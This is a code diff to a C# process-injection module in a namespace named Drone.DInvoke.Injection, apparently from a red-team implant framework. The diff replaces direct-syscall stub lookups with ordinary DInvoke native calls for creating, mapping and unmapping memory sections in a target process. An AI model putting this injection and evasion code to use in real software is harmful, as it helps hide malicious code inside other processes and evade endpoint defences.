@@ -130,12 +130,7 @@ namespace Drone.DInvoke.Injection
             var sectionHandle = new IntPtr();
             var maxSize = size;
 
-            var stub = DynamicInvoke.Generic.GetSyscallStub("NtCreateSection");
-            var ntCreateSection = (DynamicInvoke.Native.Delegates.NtCreateSection)Marshal.GetDelegateForFunctionPointer(
-                stub,
-                typeof(DynamicInvoke.Native.Delegates.NtCreateSection));
-
-            var result = ntCreateSection(
+            var result = DynamicInvoke.Native.NtCreateSection(
                 ref sectionHandle,
                 0x10000000,
                 IntPtr.Zero,
@@ -156,13 +151,8 @@ namespace Drone.DInvoke.Injection
 
             const uint disp = 2;
             const uint alloc = 0;
-            
-            var stub = DynamicInvoke.Generic.GetSyscallStub("NtMapViewOfSection");
-            var ntMapViewOfSection = (DynamicInvoke.Native.Delegates.NtMapViewOfSection)Marshal.GetDelegateForFunctionPointer(
-                stub,
-                typeof(DynamicInvoke.Native.Delegates.NtMapViewOfSection));
-            
-            var result = ntMapViewOfSection(
+
+            var result = DynamicInvoke.Native.NtMapViewOfSection(
                 hSection, 
                 hProcess,
                 ref baseAddr,
@@ -194,12 +184,7 @@ namespace Drone.DInvoke.Injection
         
         private static Native.NTSTATUS UnmapSection(IntPtr hProcess, IntPtr baseAddress)
         {
-            var stub = DynamicInvoke.Generic.GetSyscallStub("NtUnmapViewOfSection");
-            var ntUnmapViewOfSection = (DynamicInvoke.Native.Delegates.NtUnmapViewOfSection)Marshal.GetDelegateForFunctionPointer(
-                stub,
-                typeof(DynamicInvoke.Native.Delegates.NtUnmapViewOfSection));
-            
-            return ntUnmapViewOfSection(hProcess, baseAddress);
+            return DynamicInvoke.Native.NtUnmapViewOfSection(hProcess, baseAddress);
         }
     }
 }
